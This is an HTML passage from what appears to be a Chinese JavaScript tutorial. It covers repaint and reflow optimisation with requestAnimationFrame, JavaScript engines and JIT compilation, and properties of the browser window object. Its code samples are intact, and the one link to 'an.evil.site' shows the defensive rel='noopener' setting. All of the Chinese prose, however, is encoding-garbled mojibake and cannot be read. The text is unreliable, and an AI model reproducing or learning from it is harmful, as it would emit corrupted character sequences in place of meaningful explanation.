<p>ä½œä¸ºå¼€å‘è€…ï¼Œåº”è¯¥å°½é‡è®¾æ³•é™ä½é‡ç»˜çš„æ¬¡æ•°å’Œæˆæœ¬ã€‚æ¯”å¦‚ï¼Œå°½é‡ä¸è¦å˜åŠ¨é«˜å±‚çš„ DOM å…ƒç´ ï¼Œè€Œä»¥åº•å±‚ DOM å…ƒç´ çš„å˜åŠ¨ä»£æ›¿ï¼›å†æ¯”å¦‚ï¼Œé‡ç»˜<code>table</code>å¸ƒå±€å’Œ<code>flex</code>å¸ƒå±€ï¼Œå¼€é”€éƒ½ä¼šæ¯”è¾ƒå¤§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var foo &#x3D; document.getElementById(&#39;foobar&#39;);</span><br><span class="line"></span><br><span class="line">foo.style.color &#x3D; &#39;blue&#39;;</span><br><span class="line">foo.style.marginTop &#x3D; &#39;30px&#39;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç åªä¼šå¯¼è‡´ä¸€æ¬¡é‡ç»˜ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šç´¯ç§¯ DOM å˜åŠ¨ï¼Œç„¶åä¸€æ¬¡æ€§æ‰§è¡Œã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€äº›ä¼˜åŒ–æŠ€å·§ã€‚</p>
<ul>
<li>è¯»å– DOM æˆ–è€…å†™å…¥ DOMï¼Œå°½é‡å†™åœ¨ä¸€èµ·ï¼Œä¸è¦æ··æ‚ã€‚ä¸è¦è¯»å–ä¸€ä¸ª DOM èŠ‚ç‚¹ï¼Œç„¶åç«‹åˆ»å†™å…¥ï¼Œæ¥ç€å†è¯»å–ä¸€ä¸ª DOM èŠ‚ç‚¹ã€‚</li>
<li>ç¼“å­˜ DOM ä¿¡æ¯ã€‚</li>
<li>ä¸è¦ä¸€é¡¹ä¸€é¡¹åœ°æ”¹å˜æ ·å¼ï¼Œè€Œæ˜¯ä½¿ç”¨ CSS class ä¸€æ¬¡æ€§æ”¹å˜æ ·å¼ã€‚</li>
<li>ä½¿ç”¨<code>documentFragment</code>æ“ä½œ DOM</li>
<li>åŠ¨ç”»ä½¿ç”¨<code>absolute</code>å®šä½æˆ–<code>fixed</code>å®šä½ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å¯¹å…¶ä»–å…ƒç´ çš„å½±å“ã€‚</li>
<li>åªåœ¨å¿…è¦æ—¶æ‰æ˜¾ç¤ºéšè—å…ƒç´ ã€‚</li>
<li>ä½¿ç”¨<code>window.requestAnimationFrame()</code>ï¼Œå› ä¸ºå®ƒå¯ä»¥æŠŠä»£ç æ¨è¿Ÿåˆ°ä¸‹ä¸€æ¬¡é‡ç»˜ä¹‹å‰æ‰§è¡Œï¼Œè€Œä¸æ˜¯ç«‹å³è¦æ±‚é¡µé¢é‡ç»˜ã€‚</li>
<li>ä½¿ç”¨è™šæ‹Ÿ DOMï¼ˆvirtual DOMï¼‰åº“ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ª<code>window.requestAnimationFrame()</code>å¯¹æ¯”æ•ˆæœçš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; é‡æµä»£ä»·é«˜</span><br><span class="line">function doubleHeight(element) &#123;</span><br><span class="line">  var currentHeight &#x3D; element.clientHeight;</span><br><span class="line">  element.style.height &#x3D; (currentHeight * 2) + &#39;px&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.forEach(doubleHeight);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; é‡ç»˜ä»£ä»·ä½</span><br><span class="line">function doubleHeight(element) &#123;</span><br><span class="line">  var currentHeight &#x3D; element.clientHeight;</span><br><span class="line"></span><br><span class="line">  window.requestAnimationFrame(function () &#123;</span><br><span class="line">    element.style.height &#x3D; (currentHeight * 2) + &#39;px&#39;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.forEach(doubleHeight);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ç¬¬ä¸€æ®µä»£ç ï¼Œæ¯è¯»ä¸€æ¬¡ DOMï¼Œå°±å†™å…¥æ–°çš„å€¼ï¼Œä¼šé€ æˆä¸åœçš„é‡æ’å’Œé‡æµã€‚ç¬¬äºŒæ®µä»£ç æŠŠæ‰€æœ‰çš„å†™æ“ä½œï¼Œéƒ½ç´¯ç§¯åœ¨ä¸€èµ·ï¼Œä»è€Œ DOM ä»£ç å˜åŠ¨çš„ä»£ä»·å°±æœ€å°åŒ–äº†ã€‚</p>
<h4 id="JavaScript-å¼•æ“"><a href="#JavaScript-å¼•æ“" class="headerlink" title="JavaScript å¼•æ“"></a>JavaScript å¼•æ“</h4><p>JavaScript å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œè¯»å–ç½‘é¡µä¸­çš„ JavaScript ä»£ç ï¼Œå¯¹å…¶å¤„ç†åè¿è¡Œã€‚</p>
<p>JavaScript æ˜¯ä¸€ç§è§£é‡Šå‹è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¸éœ€è¦ç¼–è¯‘ï¼Œç”±è§£é‡Šå™¨å®æ—¶è¿è¡Œã€‚è¿™æ ·çš„å¥½å¤„æ˜¯è¿è¡Œå’Œä¿®æ”¹éƒ½æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ·æ–°é¡µé¢å°±å¯ä»¥é‡æ–°è§£é‡Šï¼›ç¼ºç‚¹æ˜¯æ¯æ¬¡è¿è¡Œéƒ½è¦è°ƒç”¨è§£é‡Šå™¨ï¼Œç³»ç»Ÿå¼€é”€è¾ƒå¤§ï¼Œè¿è¡Œé€Ÿåº¦æ…¢äºç¼–è¯‘å‹è¯­è¨€ã€‚</p>
<p>ä¸ºäº†æé«˜è¿è¡Œé€Ÿåº¦ï¼Œç›®å‰çš„æµè§ˆå™¨éƒ½å°† JavaScript è¿›è¡Œä¸€å®šç¨‹åº¦çš„ç¼–è¯‘ï¼Œç”Ÿæˆç±»ä¼¼å­—èŠ‚ç ï¼ˆbytecodeï¼‰çš„ä¸­é—´ä»£ç ï¼Œä»¥æé«˜è¿è¡Œé€Ÿåº¦ã€‚</p>
<p>æ—©æœŸï¼Œæµè§ˆå™¨å†…éƒ¨å¯¹ JavaScript çš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>è¯»å–ä»£ç ï¼Œè¿›è¡Œè¯æ³•åˆ†æï¼ˆLexical analysisï¼‰ï¼Œå°†ä»£ç åˆ†è§£æˆè¯å…ƒï¼ˆtokenï¼‰ã€‚</li>
<li>å¯¹è¯å…ƒè¿›è¡Œè¯­æ³•åˆ†æï¼ˆparsingï¼‰ï¼Œå°†ä»£ç æ•´ç†æˆâ€œè¯­æ³•æ ‘â€ï¼ˆsyntax treeï¼‰ã€‚</li>
<li>ä½¿ç”¨â€œç¿»è¯‘å™¨â€ï¼ˆtranslatorï¼‰ï¼Œå°†ä»£ç è½¬ä¸ºå­—èŠ‚ç ï¼ˆbytecodeï¼‰ã€‚</li>
<li>ä½¿ç”¨â€œå­—èŠ‚ç è§£é‡Šå™¨â€ï¼ˆbytecode interpreterï¼‰ï¼Œå°†å­—èŠ‚ç è½¬ä¸ºæœºå™¨ç ã€‚</li>
</ol>
<p>é€è¡Œè§£é‡Šå°†å­—èŠ‚ç è½¬ä¸ºæœºå™¨ç ï¼Œæ˜¯å¾ˆä½æ•ˆçš„ã€‚ä¸ºäº†æé«˜è¿è¡Œé€Ÿåº¦ï¼Œç°ä»£æµè§ˆå™¨æ”¹ä¸ºé‡‡ç”¨â€œå³æ—¶ç¼–è¯‘â€ï¼ˆJust In Time compilerï¼Œç¼©å†™ JITï¼‰ï¼Œå³å­—èŠ‚ç åªåœ¨è¿è¡Œæ—¶ç¼–è¯‘ï¼Œç”¨åˆ°å“ªä¸€è¡Œå°±ç¼–è¯‘å“ªä¸€è¡Œï¼Œå¹¶ä¸”æŠŠç¼–è¯‘ç»“æœç¼“å­˜ï¼ˆinline cacheï¼‰ã€‚é€šå¸¸ï¼Œä¸€ä¸ªç¨‹åºè¢«ç»å¸¸ç”¨åˆ°çš„ï¼Œåªæ˜¯å…¶ä¸­ä¸€å°éƒ¨åˆ†ä»£ç ï¼Œæœ‰äº†ç¼“å­˜çš„ç¼–è¯‘ç»“æœï¼Œæ•´ä¸ªç¨‹åºçš„è¿è¡Œé€Ÿåº¦å°±ä¼šæ˜¾è‘—æå‡ã€‚</p>
<p>å­—èŠ‚ç ä¸èƒ½ç›´æ¥è¿è¡Œï¼Œè€Œæ˜¯è¿è¡Œåœ¨ä¸€ä¸ªè™šæ‹Ÿæœºï¼ˆVirtual Machineï¼‰ä¹‹ä¸Šï¼Œä¸€èˆ¬ä¹ŸæŠŠè™šæ‹Ÿæœºç§°ä¸º JavaScript å¼•æ“ã€‚å¹¶éæ‰€æœ‰çš„ JavaScript è™šæ‹Ÿæœºè¿è¡Œæ—¶éƒ½æœ‰å­—èŠ‚ç ï¼Œæœ‰çš„ JavaScript è™šæ‹ŸæœºåŸºäºæºç ï¼Œå³åªè¦æœ‰å¯èƒ½ï¼Œå°±é€šè¿‡ JITï¼ˆjust in timeï¼‰ç¼–è¯‘å™¨ç›´æ¥æŠŠæºç ç¼–è¯‘æˆæœºå™¨ç è¿è¡Œï¼Œçœç•¥å­—èŠ‚ç æ­¥éª¤ã€‚è¿™ä¸€ç‚¹ä¸å…¶ä»–é‡‡ç”¨è™šæ‹Ÿæœºï¼ˆæ¯”å¦‚ Javaï¼‰çš„è¯­è¨€ä¸å°½ç›¸åŒã€‚è¿™æ ·åšçš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†å°½å¯èƒ½åœ°ä¼˜åŒ–ä»£ç ã€æé«˜æ€§èƒ½ã€‚ä¸‹é¢æ˜¯ç›®å‰æœ€å¸¸è§çš„ä¸€äº› JavaScript è™šæ‹Ÿæœºï¼š</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Chakra_(JScript_engine)" target="_blank" rel="noopener">Chakra</a> (Microsoft Internet Explorer)</li>
<li><a href="https://en.wikipedia.org/wiki/WebKit#JavaScriptCore" target="_blank" rel="noopener">Nitro&#x2F;JavaScript Core</a> (Safari)</li>
<li><a href="https://dev.opera.com/articles/view/labs-carakan/" target="_blank" rel="noopener">Carakan</a> (Opera)</li>
<li><a href="https://developer.mozilla.org/en-US/docs/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> (Firefox)</li>
<li><a href="https://en.wikipedia.org/wiki/Chrome_V8" target="_blank" rel="noopener">V8</a> (Chrome, Chromium)</li>
</ul>
<h2 id="windowå¯¹è±¡"><a href="#windowå¯¹è±¡" class="headerlink" title="windowå¯¹è±¡"></a>windowå¯¹è±¡</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>æµè§ˆå™¨é‡Œé¢ï¼Œ<code>window</code>å¯¹è±¡ï¼ˆæ³¨æ„ï¼Œ<code>w</code>ä¸ºå°å†™ï¼‰æŒ‡å½“å‰çš„æµè§ˆå™¨çª—å£ã€‚å®ƒä¹Ÿæ˜¯å½“å‰é¡µé¢çš„é¡¶å±‚å¯¹è±¡ï¼Œå³æœ€é«˜ä¸€å±‚çš„å¯¹è±¡ï¼Œæ‰€æœ‰å…¶ä»–å¯¹è±¡éƒ½æ˜¯å®ƒçš„ä¸‹å±ã€‚ä¸€ä¸ªå˜é‡å¦‚æœæœªå£°æ˜ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯é¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; 1;</span><br><span class="line">window.a &#x2F;&#x2F; 1</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>a</code>æ˜¯ä¸€ä¸ªæ²¡æœ‰å£°æ˜å°±ç›´æ¥èµ‹å€¼çš„å˜é‡ï¼Œå®ƒè‡ªåŠ¨æˆä¸ºé¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p>
<p><code>window</code>æœ‰è‡ªå·±çš„å®ä½“å«ä¹‰ï¼Œå…¶å®ä¸é€‚åˆå½“ä½œæœ€é«˜ä¸€å±‚çš„é¡¶å±‚å¯¹è±¡ï¼Œè¿™æ˜¯ä¸€ä¸ªè¯­è¨€çš„è®¾è®¡å¤±è¯¯ã€‚æœ€æ—©ï¼Œè®¾è®¡è¿™é—¨è¯­è¨€çš„æ—¶å€™ï¼ŒåŸå§‹è®¾æƒ³æ˜¯è¯­è¨€å†…ç½®çš„å¯¹è±¡è¶Šå°‘è¶Šå¥½ï¼Œè¿™æ ·å¯ä»¥æé«˜æµè§ˆå™¨çš„æ€§èƒ½ã€‚å› æ­¤ï¼Œè¯­è¨€è®¾è®¡è€… Brendan Eich å°±æŠŠ<code>window</code>å¯¹è±¡å½“ä½œé¡¶å±‚å¯¹è±¡ï¼Œæ‰€æœ‰æœªå£°æ˜å°±èµ‹å€¼çš„å˜é‡éƒ½è‡ªåŠ¨å˜æˆ<code>window</code>å¯¹è±¡çš„å±æ€§ã€‚è¿™ç§è®¾è®¡ä½¿å¾—ç¼–è¯‘é˜¶æ®µæ— æ³•æ£€æµ‹å‡ºæœªå£°æ˜å˜é‡ï¼Œä½†åˆ°äº†ä»Šå¤©å·²ç»æ²¡æœ‰åŠæ³•çº æ­£äº†ã€‚</p>
<h3 id="window-å¯¹è±¡çš„å±æ€§"><a href="#window-å¯¹è±¡çš„å±æ€§" class="headerlink" title="window å¯¹è±¡çš„å±æ€§"></a>window å¯¹è±¡çš„å±æ€§</h3><h4 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h4><p><code>window.name</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå½“å‰æµè§ˆå™¨çª—å£çš„åå­—ã€‚çª—å£ä¸ä¸€å®šéœ€è¦åå­—ï¼Œè¿™ä¸ªå±æ€§ä¸»è¦é…åˆè¶…é“¾æ¥å’Œè¡¨å•çš„<code>target</code>å±æ€§ä½¿ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.name &#x3D; &#39;Hello World!&#39;;</span><br><span class="line">console.log(window.name)</span><br><span class="line">&#x2F;&#x2F; &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure>

<p>è¯¥å±æ€§åªèƒ½ä¿å­˜å­—ç¬¦ä¸²ï¼Œå¦‚æœå†™å…¥çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²ã€‚å„ä¸ªæµè§ˆå™¨å¯¹è¿™ä¸ªå€¼çš„å‚¨å­˜å®¹é‡æœ‰æ‰€ä¸åŒï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥é«˜è¾¾å‡ MBã€‚</p>
<p>åªè¦æµè§ˆå™¨çª—å£ä¸å…³é—­ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸ä¼šæ¶ˆå¤±çš„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œè®¿é—®<code>a.com</code>æ—¶ï¼Œè¯¥é¡µé¢çš„è„šæœ¬è®¾ç½®äº†<code>window.name</code>ï¼Œæ¥ä¸‹æ¥åœ¨åŒä¸€ä¸ªçª—å£é‡Œé¢è½½å…¥äº†<code>b.com</code>ï¼Œæ–°é¡µé¢çš„è„šæœ¬å¯ä»¥è¯»åˆ°ä¸Šä¸€ä¸ªç½‘é¡µè®¾ç½®çš„<code>window.name</code>ã€‚é¡µé¢åˆ·æ–°ä¹Ÿæ˜¯è¿™ç§æƒ…å†µã€‚ä¸€æ—¦æµè§ˆå™¨çª—å£å…³é—­åï¼Œè¯¥å±æ€§ä¿å­˜çš„å€¼å°±ä¼šæ¶ˆå¤±ï¼Œå› ä¸ºè¿™æ—¶çª—å£å·²ç»ä¸å­˜åœ¨äº†ã€‚</p>
<h4 id="window-closedï¼Œwindow-opener"><a href="#window-closedï¼Œwindow-opener" class="headerlink" title="window.closedï¼Œwindow.opener"></a>window.closedï¼Œwindow.opener</h4><p><code>window.closed</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºçª—å£æ˜¯å¦å…³é—­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.closed &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æ£€æŸ¥å½“å‰çª—å£æ˜¯å¦å…³é—­ã€‚è¿™ç§æ£€æŸ¥æ„ä¹‰ä¸å¤§ï¼Œå› ä¸ºåªè¦èƒ½è¿è¡Œä»£ç ï¼Œå½“å‰çª—å£è‚¯å®šæ²¡æœ‰å…³é—­ã€‚è¿™ä¸ªå±æ€§ä¸€èˆ¬ç”¨æ¥æ£€æŸ¥ï¼Œä½¿ç”¨è„šæœ¬æ‰“å¼€çš„æ–°çª—å£æ˜¯å¦å…³é—­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open();</span><br><span class="line"></span><br><span class="line">if ((popup !&#x3D;&#x3D; null) &amp;&amp; !popup.closed) &#123;</span><br><span class="line">  &#x2F;&#x2F; çª—å£ä»ç„¶æ‰“å¼€ç€</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>window.opener</code>å±æ€§è¡¨ç¤ºæ‰“å¼€å½“å‰çª—å£çš„çˆ¶çª—å£ã€‚å¦‚æœå½“å‰çª—å£æ²¡æœ‰çˆ¶çª—å£ï¼ˆå³ç›´æ¥åœ¨åœ°å€æ è¾“å…¥æ‰“å¼€ï¼‰ï¼Œåˆ™è¿”å›<code>null</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open().opener &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¡¨è¾¾å¼ä¼šæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç„¶åè¿”å›<code>true</code>ã€‚</p>
<p>å¦‚æœä¸¤ä¸ªçª—å£ä¹‹é—´ä¸éœ€è¦é€šä¿¡ï¼Œå»ºè®®å°†å­çª—å£çš„<code>opener</code>å±æ€§æ˜¾å¼è®¾ä¸º<code>null</code>ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ä¸€äº›å®‰å…¨éšæ‚£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var newWin &#x3D; window.open(&#39;example.html&#39;, &#39;newWindow&#39;, &#39;height&#x3D;400,width&#x3D;400&#39;);</span><br><span class="line">newWin.opener &#x3D; null;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£çš„<code>opener</code>å±æ€§è®¾ä¸º<code>null</code>ï¼Œä¸¤ä¸ªçª—å£ä¹‹é—´å°±æ²¡åŠæ³•å†è”ç³»äº†ã€‚</p>
<p>é€šè¿‡<code>opener</code>å±æ€§ï¼Œå¯ä»¥è·å¾—çˆ¶çª—å£çš„å…¨å±€å±æ€§å’Œæ–¹æ³•ï¼Œä½†åªé™äºä¸¤ä¸ªçª—å£åŒæºçš„æƒ…å†µï¼ˆå‚è§ã€ŠåŒæºé™åˆ¶ã€‹ä¸€ç« ï¼‰ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªçª—å£ç”±å¦ä¸€ä¸ªæ‰“å¼€ã€‚<code>&lt;a&gt;</code>å…ƒç´ æ·»åŠ <code>rel=&quot;noopener&quot;</code>å±æ€§ï¼Œå¯ä»¥é˜²æ­¢æ–°æ‰“å¼€çš„çª—å£è·å–çˆ¶çª—å£ï¼Œå‡è½»è¢«æ¶æ„ç½‘ç«™ä¿®æ”¹çˆ¶çª—å£ URL çš„é£é™©ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;an.evil.site&quot; target&#x3D;&quot;_blank&quot; rel&#x3D;&quot;noopener&quot;&gt;</span><br><span class="line">æ¶æ„ç½‘ç«™</span><br><span class="line">&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="window-selfï¼Œwindow-window"><a href="#window-selfï¼Œwindow-window" class="headerlink" title="window.selfï¼Œwindow.window"></a>window.selfï¼Œwindow.window</h4><p><code>window.self</code>å’Œ<code>window.window</code>å±æ€§éƒ½æŒ‡å‘çª—å£æœ¬èº«ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.self &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br><span class="line">window.window &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h4 id="window-framesï¼Œwindow-length"><a href="#window-framesï¼Œwindow-length" class="headerlink" title="window.framesï¼Œwindow.length"></a>window.framesï¼Œwindow.length</h4><p><code>window.frames</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜ä¸ºé¡µé¢å†…æ‰€æœ‰æ¡†æ¶çª—å£ï¼ŒåŒ…æ‹¬<code>frame</code>å…ƒç´ å’Œ<code>iframe</code>å…ƒç´ ã€‚<code>window.frames[0]</code>è¡¨ç¤ºé¡µé¢ä¸­ç¬¬ä¸€ä¸ªæ¡†æ¶çª—å£ã€‚</p>
<p>å¦‚æœ<code>iframe</code>å…ƒç´ è®¾ç½®äº†<code>id</code>æˆ–<code>name</code>å±æ€§ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨å±æ€§å€¼ï¼Œå¼•ç”¨è¿™ä¸ª<code>iframe</code>çª—å£ã€‚æ¯”å¦‚<code>&lt;iframe name=&quot;myIFrame&quot;&gt;</code>å¯ä»¥ç”¨<code>frames[&#39;myIFrame&#39;]</code>æˆ–è€…<code>frames.myIFrame</code>æ¥å¼•ç”¨ã€‚</p>
<p><code>frames</code>å±æ€§å®é™…ä¸Šæ˜¯<code>window</code>å¯¹è±¡çš„åˆ«åã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frames &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œ<code>frames[0]</code>ä¹Ÿå¯ä»¥ç”¨<code>window[0]</code>è¡¨ç¤ºã€‚ä½†æ˜¯ï¼Œä»è¯­ä¹‰ä¸Šçœ‹ï¼Œ<code>frames</code>æ›´æ¸…æ™°ï¼Œè€Œä¸”è€ƒè™‘åˆ°<code>window</code>è¿˜æ˜¯å…¨å±€å¯¹è±¡ï¼Œå› æ­¤æ¨èè¡¨ç¤ºå¤šçª—å£æ—¶ï¼Œæ€»æ˜¯ä½¿ç”¨<code>frames[0]</code>çš„å†™æ³•ã€‚æ›´å¤šä»‹ç»è¯·çœ‹ä¸‹æ–‡çš„ã€Šå¤šçª—å£æ“ä½œã€‹éƒ¨åˆ†ã€‚</p>
<p><code>window.length</code>å±æ€§è¿”å›å½“å‰ç½‘é¡µåŒ…å«çš„æ¡†æ¶æ€»æ•°ã€‚å¦‚æœå½“å‰ç½‘é¡µä¸åŒ…å«<code>frame</code>å’Œ<code>iframe</code>å…ƒç´ ï¼Œé‚£ä¹ˆ<code>window.length</code>å°±è¿”å›<code>0</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.frames.length &#x3D;&#x3D;&#x3D; window.length &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œ<code>window.frames.length</code>ä¸<code>window.length</code>åº”è¯¥æ˜¯ç›¸ç­‰çš„ã€‚</p>
<h4 id="window-frameElement"><a href="#window-frameElement" class="headerlink" title="window.frameElement"></a>window.frameElement</h4><p><code>window.frameElement</code>å±æ€§ä¸»è¦ç”¨äºå½“å‰çª—å£åµŒåœ¨å¦ä¸€ä¸ªç½‘é¡µçš„æƒ…å†µï¼ˆåµŒå…¥<code>&lt; object&gt;</code>ã€<code>&lt; iframe&gt;</code>æˆ–<code>&lt; embed&gt;</code>å…ƒç´ ï¼‰ï¼Œè¿”å›å½“å‰çª—å£æ‰€åœ¨çš„é‚£ä¸ªå…ƒç´ èŠ‚ç‚¹ã€‚å¦‚æœå½“å‰çª—å£æ˜¯é¡¶å±‚çª—å£ï¼Œæˆ–è€…æ‰€åµŒå…¥çš„é‚£ä¸ªç½‘é¡µä¸æ˜¯åŒæºçš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;iframe src&#x3D;&quot;about.html&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ä¸‹é¢çš„è„šæœ¬åœ¨ about.html é‡Œé¢</span><br><span class="line">var frameEl &#x3D; window.frameElement;</span><br><span class="line">if (frameEl) &#123;</span><br><span class="line">  frameEl.src &#x3D; &#39;other.html&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>frameEl</code>å˜é‡å°±æ˜¯<code>&lt; iframe&gt;</code>å…ƒç´ ã€‚</p>
<h4 id="window-topï¼Œwindow-parent"><a href="#window-topï¼Œwindow-parent" class="headerlink" title="window.topï¼Œwindow.parent"></a>window.topï¼Œwindow.parent</h4><p><code>window.top</code>å±æ€§æŒ‡å‘æœ€é¡¶å±‚çª—å£ï¼Œä¸»è¦ç”¨äºåœ¨æ¡†æ¶çª—å£ï¼ˆframeï¼‰é‡Œé¢è·å–é¡¶å±‚çª—å£ã€‚</p>
<p><code>window.parent</code>å±æ€§æŒ‡å‘çˆ¶çª—å£ã€‚å¦‚æœå½“å‰çª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œ<code>window.parent</code>æŒ‡å‘è‡ªèº«ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.parent !&#x3D;&#x3D; window.top) &#123;</span><br><span class="line">  &#x2F;&#x2F; è¡¨æ˜å½“å‰çª—å£åµŒå…¥ä¸æ­¢ä¸€å±‚</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸åŒ…å«æ¡†æ¶çš„ç½‘é¡µï¼Œè¿™ä¸¤ä¸ªå±æ€§ç­‰åŒäº<code>window</code>å¯¹è±¡ã€‚</p>
<h4 id="window-status"><a href="#window-status" class="headerlink" title="window.status"></a>window.status</h4><p><code>window.status</code>å±æ€§ç”¨äºè¯»å†™æµè§ˆå™¨çŠ¶æ€æ çš„æ–‡æœ¬ã€‚ä½†æ˜¯ï¼Œç°åœ¨å¾ˆå¤šæµè§ˆå™¨éƒ½ä¸å…è®¸æ”¹å†™çŠ¶æ€æ æ–‡æœ¬ï¼Œæ‰€ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ä¸ä¸€å®šæœ‰æ•ˆã€‚</p>
